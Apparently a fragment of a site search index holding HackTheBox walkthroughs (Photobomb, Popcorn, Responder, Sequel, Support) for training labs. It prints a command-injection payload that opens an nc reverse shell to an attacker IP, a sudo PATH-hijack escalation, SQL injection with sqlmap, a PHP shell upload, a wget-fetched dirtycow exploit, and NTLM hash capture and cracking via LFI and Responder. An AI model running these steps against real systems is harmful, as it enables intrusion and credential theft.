}\n}\nwindow.onload = init;\n</code></pre> We login into the web with: + user: pH0t0 + password: b0Mb!</p> <p>After entering user+pass a pannel to download images is displayed. Capturing with BurpSuite this HTTP request to download an image we have: <pre><code>POST /printer HTTP/1.1\nHost: photobomb.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 78\nOrigin: http://photobomb.htb\nAuthorization: Basic cEgwdDA6YjBNYiE=\nConnection: close\nReferer: http://photobomb.htb/printer\nUpgrade-Insecure-Requests: 1\n\nphoto=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg&amp;dimensions=3000x2000\n</code></pre></p> <p>Playing a little with this request in BurpSuite (module Repeater) we can infer that the site is using ruby as a programming language. Now we can play a little with the three parameters we have in the request (photo, filetype, and dimensions) and discover that for some reason filetype is injectable. We can add either a reverse shell in ruby or a reverse shell with netcat. Python doesn't work for us here. I go for an nc reverse shell and url-encode it like this:</p> <pre><code>POST /printer HTTP/1.1\nHost: photobomb.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 164\nOrigin: http://photobomb.htb\nAuthorization: Basic cEgwdDA6YjBNYiE=\nConnection: close\nReferer: http://photobomb.htb/printer\nUpgrade-Insecure-Requests: 1\n\nphoto=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=png;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.80+24444+&gt;/tmp/f&amp;dimensions=3000x2000\n</code></pre> <p>Now, in the attacker machine (mine is 10.10.14.80), we listen on port 24444: <pre><code>nc -lnvp 24444\n</code></pre> Once we have the attacker machine listening, we go back to the repeater module in Burp Suite and launch the attack with the SEND button. We will obtain a reverse shell in the attacker machine.</p> <p>After that, we run: <pre><code>whoami\ncat /home/wizard/user.txt\n</code></pre> to get the user flag: *****</p>","tags":["walkthrough"]},{"location":"htb-photobomb/#getting-the-system-flag","title":"Getting the system flag","text":"<p>We run some basic commands: <pre><code>id\n</code></pre> Results: <pre><code>uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)\n</code></pre> <pre><code>echo $SHELL\n</code></pre> Results: <pre><code>/bin/bash\n</code></pre> <pre><code>uname -a\n</code></pre> Results: <pre><code>Linux photobomb 5.4.0-126-generic #142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre> <pre><code>sudo -l\n</code></pre></p> <p>Results:</p> <pre><code>Matching Defaults entries for wizard on photobomb:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser wizard may run the following commands on photobomb:\n    (root) SETENV: NOPASSWD: /opt/cleanup.sh\n</code></pre> <p>Two interesting things here: 1. Our user can modify environmental variables, and 2. Our user can execute /opt/cleanup.sh as root with no need for a password. Having a look at the /opt/cleanup.sh file, we can see the command \"find\" invoked with a relative path:</p> <p><pre><code>#!/bin/bash\n. /opt/.bashrc\ncd /home/wizard/photobomb\n\n# clean up log files\nif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]\nthen\n  /bin/cat log/photobomb.log &gt; log/photobomb.log.old\n  /usr/bin/truncate -s0 log/photobomb.log\nfi\n\n# protect the priceless originals\nfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;\n</code></pre> Knowing that we can modify environmental variables, we are going to create a find file with execution permissions in our folder, and then we are going to add our folder in the first position of the $PATH environmental variable. With that we will execute /opt/cleanup.sh and escalate to root.</p> <p><pre><code>cd ~\necho bash &gt; find\nchmod +x find\nsudo PATH=$PWD:$PATH /opt/cleanup.sh\n</code></pre> Now, we are root:</p> <pre><code>id\n</code></pre> <p>Results: <pre><code>uid=0(root) gid=0(root) groups=0(root)\n</code></pre></p> <p>And the flag: <pre><code>cat root.txt\n</code></pre> Results: *******</p>","tags":["walkthrough"]},{"location":"htb-popcorn/","title":"Popcorn - A HackTheBox machine","text":"","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-popcorn/#flag-usertxt","title":"Flag user.txt","text":"","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-popcorn/#reconnaissance","title":"Reconnaissance","text":"<pre><code>nmap -sC -sV -Pn 10.10.10.6 -p-\n</code></pre> <p>Result:</p> <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   1024 3ec81b15211550ec6e63bcc56b807b38 (DSA)\n|_  2048 aa1f7921b842f48a38bdb805ef1a074d (RSA)\n80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.2.12 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-popcorn/#enumeration","title":"Enumeration","text":"<pre><code>dirb http://10.10.10.6 /usr/share/wordlists/dirb/common.txt\n</code></pre> <p>First result:</p> <pre><code>---- Scanning URL: http://10.10.10.6/ ----\n+ http://10.10.10.6/.bash_history (CODE:200|SIZE:320) \n+ http://10.10.10.6/cgi-bin/ (CODE:403|SIZE:286)         + http://10.10.10.6/index (CODE:200|SIZE:177)            + http://10.10.10.6/index.html (CODE:200|SIZE:177)       + http://10.10.10.6/server-status (CODE:403|SIZE:291)    + http://10.10.10.6/test (CODE:200|SIZE:47330)           ==&gt; DIRECTORY: http://10.10.10.6/torrent/                \n</code></pre> <p>Browsing to http://10.10.10.6/.bash_history  you can get how to escalate privileges later on:</p> <p> Looks like someone exploited a dirty cow vulnerability here. La la la la.</p> <p>But let's browse the directory http://10.10.10.6/torrent/ </p> <p>Browsing around we can identify a login page at http://popcorn.htb/torrent/login.php. This login page is vulnerable to SQLi. </p> <p>We can use sqlmap to dump users' database: </p> <pre><code>sqlmap --url http://popcorn.htb/torrent/login.php --data=\"username=lele&amp;password=lalala\" -D torrenthoster -T users --dump --batch\n</code></pre> <p>Here, someone created a user before me:</p> <p></p> <p>But since registering is open, we will create our own user to login into the application.</p> <p>Once you are logged in, browse around. There exist a panel to upload your torrents. </p> <p></p> <p>Play with it. No reverse shell is allowed. But there is also another panel to edit an existing upload:</p> <p></p> <p></p> <p>The screenshot file is not properly sanitized. Try to upload a pentesmonkey, but capturing it with Burpsuite. Modify the content-type header to \"image/png\" and...</p> <p></p> <p>Reverse shell is uploaded. Get your netcat listening on port 1234 (or other):</p> <pre><code>nc -lnvp 1234\n</code></pre> <p>Click on button \"Image File not Found\" and... bingo! You have a shell on your listener.</p> <p>Spawn your shell.</p> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <p>Get user's flag in /home/george/user.txt</p>","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-popcorn/#flag-roottxt","title":"Flag root.txt","text":"<p>From previous user of the machine we know that this machine has probably a dirtycow vulnerability. But we can server from our machine the script LinPEAS.</p> <p>Now in the victim's machine:</p> <pre><code>wget http://&lt;attacker IP&gt;/linpeas.sh\nchmod +x linpeas.sh\n./linpeash.sh\n</code></pre> <p>Results:</p> <pre><code>\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Executing Linux Exploit Suggester\n\u255a https://github.com/mzet-/linux-exploit-suggester                                                                         \n[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson                                                                \n\n   Details: http://vulnfactory.org/exploits/full-nelson.c\n   Exposure: highly probable\n   Tags: [ ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)} ],ubuntu=10.04{kernel:2.6.32-(21|24)-server}\n   Download URL: http://vulnfactory.org/exploits/full-nelson.c\n\n[+] [CVE-2016-5195] dirtycow\n\n   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails\n   Exposure: probable\n   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04\n   Download URL: https://www.exploit-db.com/download/40611\n   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh\n\n[+] [CVE-2016-5195] dirtycow 2\n\n   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails\n   Exposure: probable\n   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}\n   Download URL: https://www.exploit-db.com/download/40839\n   ext-url: https://www.exploit-db.com/download/40847\n   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh\n\n[+] [CVE-2010-3904] rds\n\n   Details: http://www.securityfocus.com/archive/1/514379\n   Exposure: probable\n   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},[ ubuntu=10.10|9.10 ],fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21|24)-generic}\n   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c\n\n[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson\n\n   Details: https://www.exploit-db.com/exploits/17787/\n   Exposure: probable\n   Tags: [ ubuntu=(10.04|9.10) ]{kernel:2.6.(31|32)-(14|21)-server}\n   Download URL: https://www.exploit-db.com/download/17787\n\n[+] [CVE-2010-1146] reiserfs\n\n   Details: https://jon.oberheide.org/blog/2010/04/10/reiserfs-reiserfs_priv-vulnerability/\n   Exposure: probable\n   Tags: [ ubuntu=9.10 ]\n   Download URL: https://jon.oberheide.org/files/team-edward.py\n\n[+] [CVE-2010-0832] PAM MOTD\n\n   Details: https://www.exploit-db.com/exploits/14339/\n   Exposure: probable\n   Tags: [ ubuntu=9.10|10.04 ]\n   Download URL: https://www.exploit-db.com/download/14339\n   Comments: SSH access to non privileged user is needed\n\n[+] [CVE-2021-3156] sudo Baron Samedit\n\n   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt\n   Exposure: less probable\n   Tags: mint=19,ubuntu=18|20, debian=10\n   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main\n\n[+] [CVE-2021-3156] sudo Baron Samedit 2\n\n   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt\n   Exposure: less probable\n   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10\n   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main\n\n[+] [CVE-2021-22555] Netfilter heap out-of-bounds write\n\n   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html\n   Exposure: less probable\n   Tags: ubuntu=20.04{kernel:5.8.0-*}\n   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\n   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c\n   Comments: ip_tables kernel module must be loaded\n\n[+] [CVE-2019-18634] sudo pwfeedback\n\n   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/\n   Exposure: less probable\n   Tags: mint=19\n   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c\n   Comments: sudo configuration requires pwfeedback to be enabled.\n\n[+] [CVE-2017-6074] dccp\n\n   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3\n   Exposure: less probable\n   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}\n   Download URL: https://www.exploit-db.com/download/41458\n   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass\n\n[+] [CVE-2017-5618] setuid screen v4.5.0 LPE\n\n   Details: https://seclists.org/oss-sec/2017/q1/184\n   Exposure: less probable\n   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154\n</code></pre> <p>The second dirty cow works just fine: https://www.exploit-db.com/exploits/40839</p> <p>Serve it from your attacker machine. And from victim's:</p> <pre><code>wget http://&lt;atacker machine&gt;/40839.c\n\n\n# Compile with:\ngcc -pthread 40839.c -o dirty -lcrypt\n\n# Then run the newly create binary by either doing:\n./dirty\n# or\n./dirty &lt;my-new-password&gt;\n</code></pre> <p>Now, sudo su to the given user from the script. And you will be that user (substituting root).</p>","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-redeemer/","title":"Walkthrough - A HackTheBox machine - Redeemer","text":"<p>Enumerate open ports/services:</p> <pre><code>nmap -sC -sV $ip -Pn -p-\n</code></pre> <p>Results:</p> <p>```PORT     STATE SERVICE VERSION 6379/tcp open  redis   Redis key-value store 5.0.7 <pre><code>See [6379 Redis Cheat sheet](6379-redis.md).\n\n\n## Exploitation\n\n```bash\n\u2514\u2500$ redis-cli -h 10.129.136.187 -p 6379         \n10.129.136.187:6379&gt; INFO keyspace\n# Keyspace\ndb0:keys=4,expires=0,avg_ttl=0\n(0.60s)\n10.129.136.187:6379&gt; select 0\nOK\n10.129.136.187:6379&gt; keys *\n1) \"temp\"\n2) \"numb\"\n3) \"flag\"\n4) \"stor\"\n10.129.136.187:6379&gt; get flag\n\"03e1d2b376c37ab3f5319922053953eb\"\n</code></pre></p>","tags":["walkthrough","redis"]},{"location":"htb-responder/","title":"Responder - A HackTheBox machine","text":"<pre><code>nmap -sC -A 10.129.95.234 -Pn -p-\n</code></pre> <p>Open ports: 80, </p> <p>Browsing at port 80, we are redirected to http://unika.htb so we will add this to /etc/host.</p> <pre><code>sudo echo \"10.129.95.234    unika.htb\" &gt;&gt; /etc/hosts\n</code></pre> <p>After that, we can browse the web and wander around.</p> <p>There is a LFI - Local File Inclusion vulnerability at endpoint http://unika.htb/index.php?page=french.html. This is request in Burpsuite:</p> <pre><code>GET /index.php?page=../../../../../../../../windows/win.ini HTTP/1.1\nHost: unika.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: http://unika.htb/index.php?page=french.html\nUpgrade-Insecure-Requests: 1\n</code></pre> <p>From previous responses we know that we face a php server version 8.1.1 running on Windows, so we can use some payloads for interesting windows files. In this case, we would need some crafting to remove the \"c:/\" part. We can do it with the \"cut\" command.</p> <p>We are going to use the tool Responder.py to get the NTLM hash from server. Basically the idea is to mount a SMB server on our attacker machine with the responder tool. Responder is able to get the NTLM hash from server.</p> <pre><code>git clone https://github.com/lgandx/Responder.git   \ncd Responder\nsudo pip install -r requirements.txt\n./Responder.py -I tun1 -w -d\n</code></pre> <p>From browser enter: http://unika.htb//index.php?page=///whatever. In my case: <pre><code>http://unika.htb/index.php?page=//10.10.14.2/lalala\n</code></pre> <p>Now, from the Responder prompt we will have the hash:</p> <pre><code>[SMB] NTLMv2-SSP Client   : 10.129.95.234\n[SMB] NTLMv2-SSP Username : RESPONDER\\Administrator\n[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:fc1a74919a1b08ccn</code></pre> <p>The NetNTLMv2 includes both the challenge (random text) and the encrypted response.</p> <pre><code># Save hash in a file\necho \"Administrator::RESPONDER:fc1a74919a1b08ccgt; hash.txt\n</code></pre> <p>Crack it with John the Ripper.</p> <pre><code>john -w=/usr/share/wordlists/rockyou.txt hash.txt\n</code></pre> <p>Results:</p> <pre><code>Using default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nbadminton        (Administrator)     \n1g 0:00:00:00 DONE (2023-05-03 14:51) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>So password for Administrator is badminton.</p> <p>Also, from Responder we have this output:</p> <pre><code>Using default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nbadminton        (Administrator) \n</code></pre> <p>Now, we will connect to the WinRM (Windows Remote Management service) on the target and try to get a session. For that there is a tool called Evil-WinRM.</p> <pre><code>evil-winrm -i &lt;VictimIP&gt; -u &lt;username&gt; -p &lt;password&gt;\n\n# In my case: \nevil-winrm -i 10.129.95.234 -u Administrator -p badminton\n</code></pre> <p>You will get a powershell session. Browse around to find flag.txt. </p> <p>To echo it:</p> <pre><code>type c:/users/mike/Desktop/flag.txt\n</code></pre>","tags":["walkthrough","NTLM credential stealing","responder.py","local file inclusion","php include","web pentesting"]},{"location":"htb-sequel/","title":"Sequel - A HackTheBox machine","text":"<pre><code>nmap -sC -A 10.129.95.232 -Pn\n</code></pre> <p>Results:</p> <pre><code>Nmap scan report for 10.129.95.232\nHost is up (0.044s latency).\nNot shown: 999 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n3306/tcp open  mysql?\n| mysql-info: \n|   Protocol: 10\n|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1\n|   Thread ID: 91\n|   Capabilities flags: 63486\n|   Some Capabilities: SupportsLoadDataLocal, LongColumnFlag, IgnoreSpaceBeforeParenthesis, SupportsCompression, Support41Auth, Speaks41ProtocolOld, ConnectWithDatabase, FoundRows, SupportsTransactions, DontAllowDatabaseTableColumn, ODBCClient, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults\n|   Status: Autocommit\n|   Salt: d7$M6g&amp;&amp;+DSV7PkJptwz\n|_  Auth Plugin Name: mysql_native_password\n</code></pre> <p>Connect to database: mariadb</p> <pre><code>mariadb -h 10.129.95.232 -u root\n</code></pre> <pre><code>MariaDB [(none)]&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| htb                |\n| information_schema |\n| mysql              |\n| performance_schema |\n+--------------------+\n4 rows in set (0.049 sec)\n\nMariaDB [(none)]&gt; use htb;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\nDatabase changed\n\n\nMariaDB [htb]&gt; show tables;\n+---------------+\n| Tables_in_htb |\n+---------------+\n| config        |\n| users         |\n+---------------+\n2 rows in set (0.046 sec)\n\n\nMariaDB [htb]&gt; show tables;\n+---------------+\n| Tables_in_htb |\n+---------------+\n| config        |\n| users         |\n+---------------+\n2 rows in set (0.047 sec)\n\n\nMariaDB [htb]&gt; show columns from config;\n+-------+---------------------+------+-----+---------+----------------+\n| Field | Type                | Null | Key | Default | Extra          |\n+-------+---------------------+------+-----+---------+----------------+\n| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |\n| name  | text                | YES  |     | NULL    |                |\n| value | text                | YES  |     | NULL    |                |\n+-------+---------------------+------+-----+---------+----------------+\n3 rows in set (0.046 sec)\n\n\nMariaDB [htb]&gt; select id, name, value from config;\n+----+-----------------------+----------------------------------+\n| id | name                  | value                            |\n+----+-----------------------+----------------------------------+\n|  1 | timeout               | 60s                              |\n|  2 | security              | default                          |\n|  3 | auto_logon            | false                            |\n|  4 | max_size              | 2M                               |\n|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |\n|  6 | enable_uploads        | false                            |\n|  7 | authentication_method | radius                           |\n+----+-----------------------+----------------------------------+\n7 rows in set (0.046 sec)\n</code></pre>","tags":["walkthrough","sql","port 3306","mariadb"]},{"location":"htb-support/","title":"Walkthrough - Support, a Hack The Box machine","text":"","tags":["walkthrough"]},{"location":"htb-support/#about-the-machine","title":"About the machine","text":"data Machine Support Platform Hackthebox url link creator 0xdf OS Windows Release data 30 July 2022 Difficulty Easy Points 20 ip 10.10.11.174","tags":["walkthrough"]},{"location":"htb-support/#getting-usertxt-flag","title":"Getting user.txt flag","text":"<p>Run:</p> <pre><code>export ip=10.10.11.174\n</code></pre>","tags":["walkthrough"]},{"location":"htb-support/#reconnaissance","title":"Reconnaissance","text":"","tags":["walkthrough"]},{"location":"htb-support/#service-port-enumeration","title":"Service/ Port enumeration","text":"<p>Run nmap to enumerate open ports, services, OS, and traceroute. Do a general enumeration not to make too much noise:</p> <pre><code>sudo nmap $ip -Pn\n</code></pre> <p>Results:</p> <pre><code>Nmap scan report for 10.10.11.174\nHost is up (0.034s latency).\nNot shown: 989 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n\nNmap done: 1 IP address (1 host up) scanned in 7.90 seconds\n</code></pre> <p>Once you know open ports, run nmap to see service versions and more details:   </p> <pre><code>sudo nmap -sCV -p3,88,135,139,389,445,464,593,636,3268,3269 $ip\n</code></pre> <p>Results:</p> <pre><code>Nmap scan report for 10.10.11.174\nHost is up (0.034s latency).\n\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-08 15:56:45Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2022-11-08T15:56:49\n|_  start_date: N/A\n| smb2-security-mode:\n|   3.1.1:\n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 49.69 seconds\nzsh: segmentation fault  sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269 $ip\n</code></pre> <p>A few facts that you can gather after running this scan are: + There is a Windows Server running an Active Directory LDAP in the machine. + ldap and kerberos are available. + Domain: support.htb0.</p>","tags":["walkthrough"]},{"location":"htb-support/#enumerate","title":"Enumerate","text":"<p>Now, we can perform some basic enumeration to gather data about the target.</p> <pre><code>enum4linux 10.10.11.174\n</code></pre> <p>Among the lines in the results, you can see these interesting lines:</p> <pre><code>=========================================( Target Information )=========================================\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n ===================================( Session Check on 10.10.11.174 )===================================    \n[+] Server 10.10.11.174 allows sessions using username '', password ''\n\n================================( Getting domain SID for 10.10.11.174 )================================             \nDomain Name: SUPPORT                                                                     \nDomain Sid: S-1-5-21-1677581083-3380853377-188903654\n</code></pre> <p>Using the tool kerbrute, we will enumerate some valid usernames in the active directory:</p> <pre><code>(kali\u327fkali)-[~/tools/kerbrute/dist]\n\u2514\u2500$ ./kerbrute_linux_amd64 userenum -d support --dc 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\n</code></pre> <p>Results:</p> <pre><code>    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____\n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev (9cfb81e) - 11/09/22 - Ronnie Flathers @ropnop\n\n2022/11/09 05:16:54 &gt;  Using KDC(s):\n2022/11/09 05:16:54 &gt;   10.10.11.174:88\n\n2022/11/09 05:16:56 &gt;  [+] VALID USERNAME:  support@support\n2022/11/09 05:16:57 &gt;  [+] VALID USERNAME:  guest@support\n2022/11/09 05:17:03 &gt;  [+] VALID USERNAME:  administrator@support\n2022/11/09 05:17:52 &gt;  [+] VALID USERNAME:  Guest@support\n2022/11/09 05:17:53 &gt;  [+] VALID USERNAME:  Administrator@support\n2022/11/09 05:19:42 &gt;  [+] VALID USERNAME:  management@support\n2022/11/09 05:19:59 &gt;  [+] VALID USERNAME:  Support@support\n2022/11/09 05:20:52 &gt;  [+] VALID USERNAME:  GUEST@support\n2022/11/09 05:31:02 &gt;  [+] VALID USERNAME:  SUPPORT@support\n</code></pre> <p>The same thing we did with kerbrute, we could have done it with dnsrecon.</p> <p>Samba service is open so we can try to enumerate the shares provided by the host:</p> <pre><code># -L looks at what services are available on a target and -N forces the tool not to ask for a password\nsmbclient -L //$ip -N\n</code></pre> <p>Results:</p> <pre><code>        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share\n        support-tools   Disk      support staff tools\n        SYSVOL          Disk      Logon server share\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>","tags":["walkthrough"]},{"location":"htb-support/#initial-access","title":"Initial access","text":"<p>After trying to connect to ADMIN$, C$, we connect to the share \"support-tools\":</p> <pre><code>smbclient /\\\\10.10.11.174/\\support-tools\n</code></pre> <p>This way, we obtain a prompt command line in samba (smb: &gt;). Typing help in that command line you can see which commands you can execute.</p> <p>Also, we list the content in the folder:</p> <pre><code>dir\n</code></pre> <p>Results:</p> <pre><code>smb: \\&gt; dir\n  .                                   D        0  Wed Jul 20 13:01:06 2022\n  ..                                  D        0  Sat May 28 07:18:25 2022\n  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022\n  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022\n  putty.exe                           A  1273576  Sat May 28 07:20:06 2022\n  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022\n  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022\n  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022\n  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022\n\n                4026367 blocks of size 4096. 968945 blocks available\n</code></pre> <p>Also, we check permissions on the share and we learn that we only have read permissions. Now we are going to retrieve all these files to pay close attention. Among the commands you can execute you have mget. So we run:</p> <pre><code>mget *\n</code></pre> <p>This will download all the files to the local folder from where you initiated your samba connection. Close the connection:</p> <pre><code>quit\n</code></pre> <p>Now, have a close look at the files we have downloaded. Unzip UserInfo.exe.zip file:</p> <pre><code>unzip UserInfo.exe.zip\n</code></pre> <p>After unzipping UserInfo.exe.zip, you have two files: UserInfo.exe and UserInfo.exe.config. Run:</p> <pre><code>cat UserInfo.exe.config\n</code></pre> <p>Result:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;configuration&gt;\n    &lt;startup&gt;\n        &lt;supportedRuntime version=\"v4.0\" sku=\".NETFramework,Version=v4.8\" /&gt;\n    &lt;/startup&gt;\n  &lt;runtime&gt;\n    &lt;assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\"&gt;\n      &lt;dependentAssembly&gt;\n        &lt;assemblyIdentity name=\"System.Runtime.CompilerServices.Unsafe\" publicKeyToken=\"b03f5f7f11d50a3a\" culture=\"neutral\" /&gt;\n        &lt;bindingRedirect oldVersion=\"0.0.0.0-6.0.0.0\" newVersion=\"6.0.0.0\" /&gt;\n      &lt;/dependentAssembly&gt;\n    &lt;/assemblyBinding&gt;\n  &lt;/runtime&gt;\n&lt;/configuration&gt;\n</code></pre> <p>From this, we can know that UserInfo.exe is a binary assembled with the .NETFramework. Basically, this executable appears to be used to pull user information, likely from Active Directory. Now, if we want to go further in our inspection we will need a .NET decompiler for Linux. Here we have several options.</p> <p>Since it's open source and we are using a kali virtual machine to perform this penetration test, let's use ILSpy, but you can have a look at alternative tools at the end of this walkthrough. To run ILSpy, you need to install it before. Also, it has some dependencies like: .NET 6.0 SDK, Avalonia, dotnet... Install what you are asked and when done, run:</p> <pre><code>cd ~/tools/AvaloniaILSpy/artifacts/linux-x64\n./ILSpy\n</code></pre> <p>Open UserInfo.exe in the program and inspect the code. There are several parts in the code:</p> <ul> <li>References</li> <li>{}</li> <li>{} 